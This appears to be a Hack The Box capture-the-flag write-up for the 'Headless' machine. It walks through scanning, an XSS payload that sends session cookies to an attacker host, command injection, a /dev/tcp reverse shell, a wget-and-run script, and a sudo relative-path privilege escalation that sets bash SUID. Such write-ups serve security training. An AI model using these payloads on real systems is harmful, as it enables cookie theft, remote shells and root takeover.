---
title: HTB-Headless
draft: false
tags:
  - htb
  - linux
  - sudo
  - alwaysinstallelevated
---
![alt text](Headless.png)

## Information Gathering
### Rustscan

```bash
┌──(yoon㉿kali)-[~/Documents/htb/headless]
└─$ sudo rustscan --addresses 10.10.11.8 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍
<snip>
Host is up, received echo-reply ttl 63 (0.30s latency).
Scanned at 2024-05-15 00:28:08 EDT for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

## Enumeration
### HTTP - TCP 5000

![alt text](image.png)

/support

![alt text](image-1.png)

Directory Bruteforce 

`sudo feroxbuster -u http://10.10.11.8:5000 -C 404`

![alt text](image-2.png)

/dashboard

![alt text](image-3.png)

## XSS Cookie Stealing
https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e


![alt text](image-4.png)

```html
<script>var i=new Image(); i.src="http://10.10.14.14:8000/?cookie="+btoa(document.cookie);</script>
```

![alt text](image-5.png)

![alt text](image-6.png)

At this stage, we need to test the XSS payload across all parameters present in the POST request, including message, email, User-Agent, and others. After testing, we’ll discover that the same payload must be inserted into two parameters specifically: message and User-Agent.

`echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d`

![alt text](image-7.png)

is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0                                                                                        
![alt text](image-8.png)

![alt text](image-9.png)

## Command Execution

&& pwd

![alt text](image-10.png)

![alt text](image-11.png)


## Reverse shell

`bash -i >& /dev/tcp/10.10.14.14/1337 0>&1`

![alt text](image-12.png)

![alt text](image-13.png)


`wget http://10.10.14.14:8000/rev.sh && bash rev.sh`

![alt text](image-14.png)

![alt text](image-15.png)

## Privesc: dvir to root

`sudo -l`

![alt text](image-16.png)

/usr/bin/syscheck

```bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

```bash
echo "chmod u+s /bin/bash" > initdb.sh
chmod +x initdb.sh
```

![alt text](image-17.png)

![alt text](image-18.png)




## References


- https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e